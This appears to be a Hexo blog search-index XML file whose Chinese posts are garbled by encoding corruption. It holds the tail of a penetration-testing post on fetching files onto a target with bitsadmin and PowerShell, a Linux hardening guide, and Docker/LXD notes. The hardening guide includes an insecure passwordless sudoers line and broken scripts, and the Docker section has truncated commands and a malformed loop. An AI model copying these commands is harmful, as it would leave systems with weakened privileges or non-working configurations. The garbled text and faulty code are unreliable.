‡ä¸»æœºä½¿ç”¨äº†ç½‘ç«™ä»£ç†ï¼Œå¹¶ä¸”éœ€è¦æ´»åŠ¨ç›®å½•è¯ä¹¦ï¼Œé‚£ä¹ˆbitsadminå¯ä»¥å¸®åŠ©è§£å†³ä¸‹è½½æ–‡ä»¶çš„é—®é¢˜Noteï¼šbitsadminä¸æ”¯æŒHTTPSå’ŒFTPåè®®ï¼Œä¹Ÿä¸æ”¯æŒ win xp/ server 2003åŠä»¥å‰çš„ç‰ˆæœ¬ 6. åˆ©ç”¨PowerShellä¸‹è½½Download() DownloadString() ã€‚ã€‚ã€‚ æ•´ç†äº†ä¸€å¤©ï¼Œè¶Šæ•´è¶Šä¹±ï¼Œå¤´éƒ½å¤§äº†ï¼Œä¸‹æ¬¡ç†æ¸…äº†å†æ¥ä¼˜åŒ– document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>ç«¯å£è½¬å‘</tag>
        <tag>å†…ç½‘</tag>
        <tag>éš§é“æŠ€æœ¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linuxå®‰å…¨åŠ å›º(åˆçº§)]]></title>
    <url>%2Fposts%2F55264%2F</url>
    <content type="text"><![CDATA[Linuxå®‰å…¨åŠ å›ºä¸€ã€å®‰è£…å’Œå‡çº§ä½¿ç”¨customè‡ªå®šä¹‰å®‰è£…,ä¸å¿…è¦çš„è½¯ä»¶åŒ…å°½é‡ä¸è£…,å¦‚æœ‰å¿…è¦ç»™lilo/grubå¼•å¯¼å™¨åŠ å…¥å£ä»¤é™åˆ¶, å®‰è£…å®Œæˆåä½¿ç”¨up2dateæˆ–æ˜¯apt(Debian)å‡çº§ç³»ç»Ÿè½¯ä»¶, æœ‰æ—¶å‡çº§å†…æ ¸ä¹Ÿæ˜¯å¿…è¦çš„ã€‚ç¼–è¾‘ /etc/sudoers æ·»åŠ ä¸‹é¢å†…å®¹test1 ALL=NOPASSWD:ALL äºŒã€å¸å·å®‰å…¨1ã€ä¸€èˆ¬æœåŠ¡å™¨éƒ½æ˜¯æ”¾åœ¨IDCæœºæˆ¿,éœ€è¦é€šè¿‡è¿œç¨‹è®¿é—®è¿›è¡Œç®¡ç†,è¦é™åˆ¶rootçš„è¿œç¨‹è®¿é—®,ç®¡ç†å‘˜é€šè¿‡æ™®é€šå¸å·è¿œç¨‹ç™»å½•,ç„¶åsuåˆ°root,å¼€å‘äººå‘˜åªä½¿ç”¨æ™®é€šå¸å·æƒé™ã€‚ 1) åœ¨/etc/default/login æ–‡ä»¶,å¢åŠ ä¸€è¡Œè®¾ç½®å‘½ä»¤: CONSOLE = /dev/tty01 2) å¯ä»¥é€šè¿‡ä¸‹é¢çš„è„šæœ¬ç¦æ­¢å¯¹æ§åˆ¶å°çš„è®¿é—®: #! /bin/sh cd /etc/pam.d for i in * do sed '/[^#].*pam_console.so/s/^/#/' foo &amp;&amp; mv foo $I done 3) é€šè¿‡ä¸‹é¢çš„æªæ–½å¯ä»¥é˜²æ­¢ä»»ä½•äººéƒ½å¯ä»¥suä¸ºroot,åœ¨/etc/pam.d/suä¸­æ·»åŠ å¦‚ä¸‹ä¸¤è¡Œã€‚ auth sufficient /lib/security/$ISA/pam_rootok.so debug = auth required /lib/security/$ISA/pam_wheel.so group=wheel ç„¶åæŠŠæ‚¨æƒ³è¦æ‰§è¡Œsuæˆä¸ºrootçš„ç”¨æˆ·æ”¾å…¥wheelç»„: usermod -G10 admin 2ã€ç¼–è¾‘/etc/securetty, æ³¨é‡Šæ‰æ‰€æœ‰å…è®¸rootè¿œç¨‹ç™»å½•çš„æ§åˆ¶å°, ç„¶åç¦æ­¢ä½¿ç”¨æ‰€æœ‰çš„æ§åˆ¶å°ç¨‹åº, å…¶å‘½ä»¤å¦‚ä¸‹: rm -f /etc/security/console.apps/servicename ä¸‰ã€æœ€å°‘æœåŠ¡åŸåˆ™é‡‡ç”¨æœ€å°‘æœåŠ¡åŸåˆ™, å‡¡æ˜¯ä¸éœ€è¦çš„æœåŠ¡ä¸€å¾‹æ³¨é‡Šæ‰ã€‚åœ¨/etc/inetd.confä¸­ä¸éœ€è¦çš„æœåŠ¡å‰åŠ â€#â€, è¾ƒé«˜ç‰ˆæœ¬ä¸­å·²ç»æ²¡æœ‰inetd, è€Œæ¢æˆäº†Xinetd; å–æ¶ˆå¼€æœºè‡ªåŠ¨è¿è¡ŒæœåŠ¡, æŠŠ/etc/rc.d/rc3.dä¸‹ä¸éœ€è¦è¿è¡Œçš„è‚¥åŠ¡çš„ç¬¬ä¸€ä¸ªå­—æ¯â€Sâ€æ”¹æˆâ€Kâ€,å…¶ä»–ä¸å˜. å››ã€æ–‡ä»¶ç³»ç»Ÿæƒé™1) æ‰¾å‡ºç³»ç»Ÿä¸­æ‰€æœ‰å«sâ€ä½çš„ç¨‹åº,æŠŠä¸å¿…è¦çš„â€sâ€ä½å»æ‰, æˆ–è€…æŠŠæ ¹æœ¬ä¸ç”¨çš„ç›´æ¥åˆ é™¤, è¿™æ ·å¯ä»¥é˜²æ­¢ç”¨æˆ·æ»¥ç”¨åŠæå‡æƒé™çš„å¯èƒ½æ€§,å…¶å‘½ä»¤å¦‚ä¸‹: find / -type f -perm -4000 -o -perm -2000 -print | xargs ls -lg 2) æŠŠé‡è¦æ–‡ä»¶åŠ ä¸Šä¸å¯æ”¹å˜å±æ€§(ä¸€èˆ¬æƒ…å†µä¸ç”¨è¿™ä¹ˆåš): chattr +i /etc/passwd Immutable, ç³»ç»Ÿä¸å…è®¸å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œä»»ä½•çš„ä¿®æ”¹ã€‚å¦‚æœç›®å½•å…·æœ‰è¿™ä¸ªå±æ€§, é‚£ä¹ˆä»»ä½•çš„è¿›ç¨‹åªèƒ½ä¿®æ”¹ç›®å½•ä¹‹ä¸‹çš„æ–‡ä»¶,ä¸å…è®¸å»ºç«‹å’Œåˆ é™¤æ–‡ä»¶ã€‚ 3) æ‰¾å‡ºç³»ç»Ÿä¸­æ²¡æœ‰å±ä¸»çš„æ–‡ä»¶: find / -nouser -o -nogroup 4) æ‰¾å‡ºä»»ä½•éƒ½æœ‰å†™æƒé™çš„æ–‡ä»¶å’Œç›®å½•: find / -type f -perm -2 -o -perm -20 |xagrs ls -lg find / -type d -perm -2 -o -perm -20 |xagrs ls -ldg 5)ftpçš„ä¸Šä¼ ç›®å½•ä¸èƒ½ç»™ä¸æ‰§è¡Œæƒé™, å¦‚æä¾›å¯è¿è¡ŒCGIçš„è™šæ‹Ÿä¸»æœºæœåŠ¡, åº”è¯¥åšé¢å¤–å®‰å…¨é…ç½®.ç¼–è¾‘/etc/security/limits.conf, åŠ å…¥æˆ–æ”¹å˜å¦‚ä¸‹è¡Œ: hard core 0 hard rss 5000 hard nproc 20 äº”.Bannerä¼ªè£…1)å…¥ä¾µè€…é€šå¸¸é€šè¿‡æ“ä½œç³»ç»Ÿã€æœåŠ¡åŠåº”ç”¨ç¨‹åºç‰ˆæœ¬æ¥æ”»å‡», æ¼æ´åˆ—è¡¨å’Œæ”»å‡»ç¨‹ä¹Ÿæ˜¯æŒ‰æ­¤æ¥åˆ†ç±», æ‰€ä»¥æˆ‘ä»¬æœ‰å¿…è¦ä½œç‚¹æ‰‹è„šæ¥åŠ å¤§å…¥ä¾µçš„éš¾åº¦ã€‚æ‰€ä»¥ç¼–è¾‘/etc/rc.d/rc.localå¦‚ä¸‹: echo "Kernel $(uname -r) on $a $(uname -m)" >/etc/issue echo "Kernel \r on an \m" >> /etc/issue cp -f /etc/issue /etc/issue.net echo >> /etc/issue 2)å¯¹äºApacheçš„é…ç½®æ–‡ä»¶,æ‰¾åˆ°ServerTokenså’ŒServerSignatureä¸¤ä¸ªdirective,ä¿®æ”¹å…¶é»˜è®¤å±æ€§å¦‚ä¸‹,ä½¿ç”¨ä¸å›æ˜¾ç‰ˆæœ¬å·: ServerTokens prod ServerSignature Off å…­ã€IPTABLESé˜²ç«å¢™è§„åˆ™:iptables -A INPUT -p --dport 22 -j ACCEPT iptables -A INPUT -i eth0 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -A INPUT -j DROP ä»¥ä¸Šè§„åˆ™å°†é˜»æ­¢ç”±å†…è€Œå¤–çš„TCPä¸»åŠ¨é€‰æ¥ã€‚ä¸Šé¢æ˜¯ä¸€ä¸ªç®€å•ä¾‹å­,IPTABLESåŠŸèƒ½ååˆ†å¼ºå¤§, å¯ä»¥æ ¹æ®å…·ä½“æƒ…å†µè®¾ç½®é˜²ç«å¢™è§„åˆ™ã€‚ ä¸ƒã€tripwiretripwireæ˜¯ä¸€ä¸ªæ¯”è¾ƒæœ‰åçš„å·¥å…·,å®ƒèƒ½å¸®ä½ åˆ¤æ–­å‡ºä¸€äº›é‡è¦ç³»ç»Ÿæ–‡ä»¶æ˜¯å¦è¢«ä¿®æ”¹è¿‡ã€‚ç°åœ¨çš„Linuxå‘è¡Œç‰ˆä¸­ä¸€èˆ¬éƒ¨å¸¦æœ‰è¯¥å·¥å…·çš„å¼€æºç‰ˆæœ¬,åœ¨é»˜è®¤çš„æ ¡éªŒå¯¹è±¡é…ç½®æ–‡ä»¶ä¸­åŠ å…¥ä¸€äº›æ•æ„Ÿæ–‡ä»¶å°±å¯ä»¥ä½¿ç”¨ã€‚ å…«.è‡ªè¡Œæ‰«ææ™®é€šçš„å®‰å…¨åŠ å›ºåŸºæœ¬ä¸Šæ˜¯åšå®Œäº†,æˆ‘ä»¬å¯ä»¥è‡ªå·±åšä¸€ä¸ªé£é™©è¯„ä¼° ,æ¨èä½¿ç”¨nessusæˆ–å…¶ä»–å·¥å…·ã€‚ ä¹.æ—¥å¿—ç­–ç•¥ä¸»è¦å°±æ˜¯åˆ›å»ºå¯¹äººä¾µç›¸å…³çš„é‡è¦æ—¥å¿—çš„ç¡¬æ‹·è´, ä¸è‡´äºåº”æ€¥å“åº”çš„æ—¶å€™è¿æœ€åçš„é»‘åŒ£å­éƒ½æ²¡æœ‰ã€‚å¯ä»¥æŠŠå®ƒä»¬é‡å®šå‘åˆ°æ‰“å°æœº, ç®¡ç†å‘˜é‚®ä»¶, ç‹¬ç«‹çš„æ—¥å¿—æœåŠ¡å™¨åŠå…¶çƒ­å¤‡ä»½ã€‚ å.Snortå…¥ä¾µæ£€æµ‹ç³»ç»Ÿå¯¹äººä¾µå“åº”å’Œå®‰å…¨æ—¥å¿—è¦æ±‚è¾ƒé«˜çš„ç³»ç»Ÿæœ‰æ­¤å¿…è¦ï¼›å¯¹äºä¸€èˆ¬çš„ç³»ç»Ÿè€Œè¨€, å¦‚æœç®¡ç†å‘˜æ ¹æœ¬ä¸ä¼šå»çœ‹ä¸€å¤§å †æ—¥å¿—, é‚£ä¹ˆå®ƒç™½ç™½å ç”¨ç³»ç»Ÿèµ„æº, å°±å¦‚åŒé¸¡è‚‹ä¸€æ ·ã€‚å¯¹Linuxå¹³å°ä¸‹ç—…æ¯’çš„é˜²èŒƒæ€»ç»“å‡ºä»¥ä¸‹å‡ æ¡å»ºè®®, ä»…ä¾›å‚è€ƒ: (1) åšå¥½ç³»ç»ŸåŠ å›ºå·¥ä½œã€‚ (2) ç•™å¿ƒå®‰å…¨å…¬å‘Š,åŠæ—¶ä¿®æ­£æ¼æ´ã€‚ (3) æ—¥å¸¸æ“ä½œä¸è¦ä½¿ç”¨rootæƒé™è¿›è¡Œã€‚ (4) ä¸è¦éšä¾¿å®‰è£…æ¥å†ä¸æ˜çš„å„ç§è®¾å¤‡é©±åŠ¨ç¨‹åºã€‚ (5) ä¸è¦åœ¨é‡è¦çš„æœåŠ¡å™¨ä¸Šè¿è¡Œä¸€äº›æ¥å†ä¸æ˜çš„å¯æ‰§è¡Œç¨‹åºæˆ–è„šæœ¬ã€‚ (6) å°½é‡å®‰è£…é˜²æ¯’è½¯ä»¶,å¹¶å®šæœŸå‡çº§ç—…æ¯’ä»£ç åº“ã€‚ (7) å¯¹äºè¿æ¥åˆ°Internetçš„LinuxæœåŠ¡å™¨,è¦å®šæœŸæ£€æµ‹Linuxç—…æ¯’ã€è •è™«å’Œæœ¨é©¬æ˜¯å¦å­˜åœ¨ã€‚ (8) å¯¹äºæä¾›æ–‡ä»¶æœåŠ¡çš„LinuxæœåŠ¡å™¨,æœ€å¥½éƒ¨ç½²ä¸€æ¬¾å¯ä»¥åŒæ—¶æŸ¥æ€Windowså’ŒLinuxç—…æ¯’çš„è½¯ä»¶ã€‚ (9) å¯¹äºæä¾›é‚®ä»¶æœåŠ¡çš„LinuxæœåŠ¡å™¨,æœ€å¥½é…åˆä½¿ç”¨ä¸€ä¸ªE-mailç—…æ¯’æ‰«æå™¨ã€‚ æ€»è€Œè¨€ä¹‹ï¼Œå¯¹äºLinuxå¹³å°ä¸‹ç—…æ¯’çš„é˜²èŒƒè¦é‡‡å–å¤šç§æ‰‹æ®µï¼Œå†³ä¸å¯å› ä¸ºç°åœ¨Linuxç—…æ¯’å¾ˆå°‘å°±æ‰ä»¥è½»å¿ƒã€‚ æœ‰äº›é…ç½®æ–‡ä»¶å¯èƒ½å·²ç»è¿‡æ—¶äº†ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„ç³»ç»Ÿç»§ç»­åŠ å›ºï¼Œæœªå®Œå¾…ç»­â€¦ â€¦å‚è€ƒçš„æŸä¸ªèµ„æ–™ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°åŸæ–‡é“¾æ¥äº† document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>å®‰å…¨åŠ å›º</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-å®¹å™¨]]></title>
    <url>%2Fposts%2F25260%2F</url>
    <content type="text"><![CDATA[å®¹å™¨ æœ‰äº†æ–°æ­¦å™¨ï¼Œå¹¶ä¸è¡¨ç¤ºæ—§æ­¦å™¨æ²¡æœ‰ç”¨ é¢˜å¤–è¯ å®¹å™¨ SDN -&gt; è½¯ä»¶å®šä¹‰ç½‘ç»œ å®¹å™¨ -&gt; åŸºäºæ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œå…±äº«å®¿ä¸»æœºçš„CPU -&gt; æ“ä½œç³»ç»Ÿçš„è¿›ç¨‹ä¹‹é—´è¿›è¡Œéš”ç¦» -&gt; å®‰å…¨æ€§æ¯”è™šæ‹Ÿæœºå·®ä¸€äº› -&gt; å¯ç§»æ¤æ€§ ä»€ä¹ˆæ˜¯å®¹å™¨æœ‰ä¸ªæ„Ÿæ€§çš„è®¤è¯†å³å¯ï¼Œç°åœ¨è¿˜æ²¡æœ‰æ˜ç¡®çš„ç»Ÿä¸€å®šä¹‰ï¼Œæ ¹æ®ä¸åŒäº§å“å…·ä½“ç†è§£ å¸¸è§çš„å®¹å™¨æŠ€æœ¯Docker vs LXD/LXC ä¸åŒå®¹å™¨çš„ç¨‹åºçš„pidå¯ä»¥ç›¸åŒ è¶Šç‹± Docker åº”ç”¨ç¨‹åºæ–¹é¢çš„å®¹å™¨ Dockerå¼•æ“åªå¯ä»¥ç›´æ¥è¿è¡Œåœ¨Linuxç³»ç»Ÿä¸Š åˆ©ç”¨'Boot2Docker'ç­‰é€‚é…å™¨å¸®åŠ©ï¼Œä½¿ç”¨è½»é‡çº§'Linux vm'å¯åœ¨macå’Œå¾®è½¯ç³»ç»Ÿä¸Šè¿è¡Œ å®‰è£…Dockerå¼•æ“(ä¸¤ç§æ–¹æ³•)uname -m # ä»…64ä½ç³»ç»Ÿä¿éšœ(ä½†32ä½ç³»ç»Ÿå¯ç”¨) ##### ç¬¬ä¸€ç§åŠæ³•ï¼šç›´æ¥ä»ubuntuè½¯ä»¶åŒ…å®‰è£…(æ¯”è¾ƒæ—§), å·²ç»æœ‰ä¸€ä¸ªè€ç‰ˆæœ¬ubuntuåŒ…åä¸ºdockerï¼Œ sudo apt install docker.io systemctl status docker # å°†å½“å‰ç”¨æˆ·åŠ å…¥dockerç»„(ä¸ç”¨sudoäº†) sudo usermod -aG docker ${USER} # é‡å¯ ##### ç¬¬äºŒç§åŠæ³•ï¼š # å®‰è£…ä¾èµ–åŒ… udo apt-get install apt-transport-https ca-certificates curl software-properties-common # æ·»åŠ dockerå®˜æ–¹GPG key(é˜²æ­¢ä¼ªé€ ,ä¾›åº”é“¾æ”»å‡») url -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - # æ·»åŠ dockerå®˜æ–¹åº“æ›´æ–°æº sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" # å®‰è£… sudo apt update sudo apt-get install docker-ce # ç¤¾åŒºç‰ˆæœ¬ å®¢æˆ·ç«¯å·¥å…·: docker åŸºæœ¬å‘½ä»¤# æŸ¥çœ‹ä¿¡æ¯ docker version docker info # æŸ¥çœ‹è¿è¡Œäº†å‡ ä¸ªå®¹å™¨ # Registry: åº”ç”¨ç¨‹åºçš„ä»“åº“(åŸºæœ¬linuxæ˜ åƒï¼Œ) # æœç´¢é•œåƒ(æœ‰å®˜æ–¹æœ‰ä¸ªäººçš„: ç”¨æˆ·å/å®¹å™¨å) --> å»ºè®®ä¸‹è½½å®˜æ–¹çš„imageç„¶åè‡ªå·±æ‰“é€ å®¹å™¨ docker search apache2 # ä¸‹è½½é•œåƒ docker pull hello-world # ä¸‹è½½æ—¶å€™æŒ‡å®š-aï¼ˆä¼šä¸‹è½½æ‰€æœ‰ç‰ˆæœ¬ï¼‰ docker pull hello-world -a # æŸ¥çœ‹é•œåƒ docker images # è¿è¡Œå®¹å™¨ docker run busybox echo "hello" # åˆ é™¤image docker rmi busybox:1-musl DockeråŸºæœ¬æ¦‚å¿µDocker æ˜ åƒ ç»„æˆåº”ç”¨ç¨‹åºè¿è¡Œæ‰€éœ€çš„å…¨éƒ¨æ–‡ä»¶åˆé›† åªè¯»/è¯»å†™ åˆ†å±‚ç»“æ„(æ¯æ¬¡å¯¹æ˜ åƒçš„ä¿®æ”¹éƒ½é€šè¿‡commitå½¢æˆä¸€ä¸ªæ–°å±‚) å®¹å™¨å±‚ æ˜¯åŸºäºæ˜ åƒå¯è¯»å†™çš„é¡¶å±‚ æ˜ åƒå±‚æ‰€æœ‰çš„Dockeræ˜ åƒéƒ½æºè‡ªäºä¸€ä¸ªåŸºç¡€é•œåƒ(Debian/Ubuntu) â€“&gt; åªè¯»ï¼Œä¸å¯ä¿®æ”¹i å…¶ä»–çš„åŠŸèƒ½æ¨¡å—é™„åŠ äºåŸºç¡€å½±åƒå½¢æˆæœ€ç»ˆç¨‹åº Docker images æ˜¯æ„å»ºDocker containerçš„åŸºç¡€ Docker å±‚/å®¹å™¨å±‚ æ¯ä¸ªæ˜ åƒæœ‰å”¯ä¸€çš„ID(SHA256/ å–å‰6å­—èŠ‚æ¥æ˜¾ç¤º) docker images # å¯çœ‹åˆ°å”¯ä¸€çš„image id # TAG: é»˜è®¤æ˜¯æœ€æ–°ç‰ˆæœ¬(latest) docker images --no-trunc # å¯ä»¥çœ‹åˆ°å®Œæ•´çš„SHA256å®Œæ•´çš„å­—èŠ‚ Dockerå®¹å™¨imagesæ˜¯åªè¯»çš„ï¼Œåœ¨åŸºç¡€ä¸Šåˆ›å»ºå¹¶è¿è¡Œå®¹å™¨(å¯è¯»å†™) # æŸ¥çœ‹è¿è¡Œçš„å®¹å™¨ï¼ˆæ¯ä¸ªå®¹å™¨éƒ½æœ‰å”¯ä¸€çš„idï¼‰ docker ps # ä¸æ˜¾ç¤ºå…³é—­çš„å®¹å™¨ docker ps -a # æ˜¾ç¤ºæ‰€æœ‰çŠ¶æ€çš„å®¹å™¨ #æ˜¾ç¤ºå­—æ®µï¼š æœ‰å®¹å™¨id, åŸºäºimageçš„åå­—ï¼Œcommand, å®¹å™¨åˆ›å»ºæ—¶é—´ï¼Œ status, ports, names(éšæœºç”Ÿæˆçš„,å¯ä»¥æ”¹) # åŸºäºimageè¿è¡Œå®¹å™¨(æ¯æ¬¡è¿è¡Œä¸€æ¬¡éƒ½äº§ç”Ÿä¸€ä¸ªæ–°çš„å®¹å™¨!) docker run busybox echo "hello" docker run busybox:1-uclibc echo "hello" # æŒ‡å®šæ ‡ç­¾æ¥ç”¨å“ªä¸ª(å¦‚æœæœ¬æœºæ²¡æœ‰ï¼Œä¼šè‡ªåŠ¨pull) # docker run -i -t busybox:ubuntu-16.04 # åˆ é™¤å®¹å™¨ docker stop d751d48a6d0a # å¦‚æœè¿è¡Œäº†å…ˆstopæ‰ docker rm d751d48a6d0a pullçš„æ—¶å€™ï¼Œé»˜è®¤ä¼šå»ä¸€ä¸ªäººurlåœ°å€å¯»æ‰¾é•œåƒ Docker Resigtryç›¸å½“äºç›®å½•ï¼ŒRepositoryç›¸å½“äºå…·ä½“æ–‡ä»¶ä½ç½® å¯ä»¥è‡ªå»ºæ˜ åƒåº“ Dockerä½¿ç”¨åŸºæœ¬å‘½ä»¤ # è¿è¡Œé•œåƒåäº¤äº’ç™»å½•å…¥å®¹å™¨ï¼ˆè¿™é‡ŒåŸºäºubuntuï¼‰ # --name ä¿®æ”¹å®¹å™¨çš„é»˜è®¤åå­—ï¼ŒæŒ‡å®š docker run --name xxx01 -it ubuntu /bin/bash # é€€å‡º exit / ctrl + D # é€€å‡ºå®¹å™¨ç»ˆç«¯ï¼Œä½†é€€å‡ºä¸å…³é—­å®¹å™¨ ctrl + P , ctrl + Q # ç»„åˆ # å¯åŠ¨å®¹å™¨ docker start id_id_id # ç»§ç»­è¿›å…¥æ­£åœ¨è¿è¡Œçš„å®¹å™¨ docker attach xxx01 # é‡å‘½åå®¹å™¨ docker rename 453dsdaojp test01 # å®¹å™¨ä¸é•œåƒå¯¹æ¯”å˜åŒ– docker diff 453dsdaojp test02 - C:ä¿®æ”¹äº† - A:å¢åŠ äº† - D:åˆ é™¤äº† ### æ—¥å¸¸ç®¡ç†å‘½ä»¤ docker start 453dsdaojp docker restart 453dsdaojp docker stop 453dsdaojp docker rename 453dsdaojp docker pause 453dsdaojp # æŒ‚èµ· docker unpause 453dsdaojp # æ¢å¤ åˆ›å»ºæ˜ åƒ docker run -it ubuntu /bin/bash .... # è¿›å…¥å®¹å™¨è¿›è¡Œä¸€äº›äº†ä¿®æ”¹ ctrl + p, ctrl + q docker commit test01 xps/test:0.1 # åˆ›å»ºäº†æ–°çš„image # ç„¶åå¯ä»¥ä¸Šä¼ åˆ°docker Resigtry # åé¢å°±è·Ÿåˆ«çš„imageä¸€æ ·ä½¿ç”¨å¯ä»¥åˆ›å»ºå®¹å™¨ç­‰ åå°è¿è¡Œå®¹å™¨ # ä¸è¿›å…¥äº¤äº’æ–¹å¼çš„shell docker run -d ubuntu /bin/bash -c "while true; sleep 3; do date";done æŸ¥çœ‹æ—¥å¿— docker logs 453dsdaojp å®ä¾‹ # é…ç½®ä¸€ä¸ªapacheï¼Œå¹¶å¯ä»¥å¤–éƒ¨è®¿é—® docker run -dit -p 8080:80 ubuntu /bin/bash # ç«¯å£æ˜ å°„(å¤–éƒ¨:å®¹å™¨ç«¯å£) docker attach doasdkop463fd # è¿›å…¥å®¹å™¨ apt update &amp;&amp; apt install apache2 # æ­£å¸¸æ“ä½œ /etc/init.d/apache2 start ctrl+p, ctrl+Q # å®¿ä¸»æœºæµè§ˆå™¨è®¿é—® http://å®¿ä¸»æœºip:8080 ## æœåŠ¡è‡ªåŠ¨å¯åŠ¨(æˆ–è€…æ‰‹åŠ¨æŠŠä¸‹é¢å†…å®¹è¾“å…¥è¿›å») echo '/etc/init.d/apache2 start' >> /etc/bash/rc ## åŸºäºé…ç½®å¥½çš„å®¹å™¨åˆ›å»ºæ–°çš„é•œåƒ docker commit ubuntu xps/apache1:0.1 # åˆ›å»ºäº†æ–°çš„image # æ‰“åŒ…å¥½ä¹‹åä¸Šä¼ åˆ°hubï¼Œå°±å¯ä»¥æ­£å¸¸ä¸‹è½½å’Œä½¿ç”¨imageäº† Dockerfiles å‰é¢çš„ä¸‹è½½ï¼Œåˆ¶ä½œï¼Œä¸Šä¼ ï¼Œå†ä¸‹è½½çš„æ–¹æ³•ä¹ŸæŒºéº»çƒ¦çš„ ä½¿ç”¨Dockerfileè‡ªåŠ¨åˆ›å»ºæ˜ åƒï¼ˆDockerfileæ–‡æœ¬æ–‡ä»¶ï¼ŒåŒ…å«åˆ›å»ºå®¹å™¨çš„æŒ‡ä»¤ï¼‰ è¿™é‡Œè¿˜æ˜¯ä»¥apacha2ä¸ºä¾‹1.å…ˆå†™é…ç½®æ–‡ä»¶ # vim Dockerfile FROM ubuntu # ä»å®˜æ–¹ä¸‹è½½é•œåƒ MAINTAINER xps &lt;xps@admin.com> RUN apt update; apt dist-upgrade -y RUN apt install -y apache2 vim RUN echo '/etc/init.d/apache2 start' >> /etc/bash/rc 2.åŸºäºdockerfileæ¥åˆ›å»ºå®¹å™¨ # æ ‡ç­¾è‡ªå·±å®šä¹‰å³å¯, æœ€åçš„ç‚¹(.) è¡¨ç¤ºå½“å‰ç›®å½•ä¸‹çš„dockerfile docker build -t test/apache-server:1.0 . # ç„¶årunåˆ›å»ºå¯åŠ¨å®¹å™¨ docker run -dit -p 8080:80 test/apache-server:1.0 /bin/bash PS: æ›´æ·±å…¥çš„DockerfileçŸ¥è¯†å†å¦å¤–å­¦ LXDç‰¹ç‚¹ - lxd æ–°éƒ¨ç½²å®¹å™¨è¿‡ç¨‹æ¯”Dockeræ›´å®¹æ˜“ - é€€å‡ºå®¹å™¨æ—¶ä¸å¿…ä»¥ç‰¹å®šçš„æ–¹å¼é€€å‡º - lxd å®¹å™¨ä¸­æ²¡æœ‰å±‚çš„æ¦‚å¿µ - Dockerä¸­çš„å±‚å¯ä»¥ä½¿éƒ¨ç½²æ›´å¿«(æ²¡æœ‰æ¸…ç†ä¹Ÿå¯èƒ½æ„Ÿè§‰æ··ä¹±) å®‰è£… # snapé€‚ç”¨æ‰€æœ‰å‘è¡Œç‰ˆæœ¬ sudo snap install lxd # sudo apt install lxd # ubuntuå®˜æ–¹åŒ…aptä¸€èˆ¬ä¸­ä¸ä¼šæ˜¯æœ€æ–°çš„è½¯ä»¶åŒ… sudo usermod -aG lxd ${USER} # å½“å‰ç”¨æˆ·åŠ å…¥lxdç»„ï¼Œå°±å…·æœ‰ç®¡ç†æƒé™äº† # é‡å¯ä¸»æœº åˆå§‹åŒ– lxd init # å›ç­”é—®é¢˜(é»˜è®¤å³å¯) è¿è¡Œå®¹å™¨ # åˆ›å»ºå®¹å™¨ lxc launch ubuntu:18.04 C01 # C01æ˜¯å®¹å™¨åç§° # è‡ªåŠ¨ä»è¿œç¨‹æœåŠ¡å™¨ä¸‹è½½æ˜ åƒå¹¶åˆ›å»ºã€è¿è¡Œå®¹å™¨(ä»å›½å¤–ä¸‹è½½ï¼Œé€Ÿåº¦ç¨å¾®æ…¢) # - lxdå‘½ä»¤é’ˆå¯¹lxdç®¡ç†å±‚ # - å®¹å™¨ç®¡ç†å‘½ä»¤ä»ç„¶ä½¿ç”¨lxc å¸¸ç”¨ç®¡ç†å‘½ä»¤ lxc list # åˆ—å‡ºæ‰€æœ‰çš„å®¹å™¨ lxc start c_name # å¯åŠ¨å®¹å™¨ lxc stop c_name # åœæ­¢å®¹å™¨ lxc delete c_name # åˆ é™¤å®¹å™¨ lxc image list # æŸ¥çœ‹é•œåƒ lxc image delete # åˆ é™¤é•œåƒ äº¤äº’ç™»å½•å®¹å™¨ # æ‰§è¡ŒæŸä¸ªå®¹å™¨çš„ä»€ä¹ˆå‘½ä»¤ lxc exec C01 bash # rootå¸å·ç™»å½• lxc exec C01 -- sudo --login --user ubuntu # ubuntué•œåƒåŒ…å«ä¸€ä¸ªé»˜è®¤è´¦æˆ·ubuntu # åœ¨æœ¬åœ°ç»ˆç«¯ç›´æ¥æ‰§è¡Œå®¹å™¨å†…éƒ¨çš„å‘½ä»¤ lxc exec C01 -- apt update # é€€å‡ºå®¹å™¨(å®¹å™¨ä¾ç„¶æ˜¯runçš„çŠ¶æ€) ctrl+D / exit éšå®¿ä¸»æœºçš„å¯åŠ¨, è‡ªåŠ¨å¯åŠ¨æŸä¸ªå®¹å™¨ lxc config set C01 boot.autostart 1 è¿œç¨‹æ˜ åƒå­˜å‚¨æœåŠ¡å™¨ # åˆ—å‡ºè¿œç¨‹æ˜ åƒå­˜å‚¨æœåŠ¡å™¨ lxc remote list # é»˜è®¤ä¸‰ä¸ª - images # å­˜å‚¨å…¶ä»–Linuxå‘è¡Œç‰ˆé•œåƒ - ubuntu # ubuntuè‡ªå·±æ­£å¼å‘å¸ƒçš„ç³»ç»Ÿé•œåƒ - ubuntu-daily # ubuntuè‡ªå·±çš„éæ­£å¼çš„ç³»ç»Ÿé•œåƒ(æ¯å¤©æ›´æ–°çš„) ä»è¿œç¨‹å¤åˆ¶æ˜ åƒ lxc launch images:debian/stretch test01 # 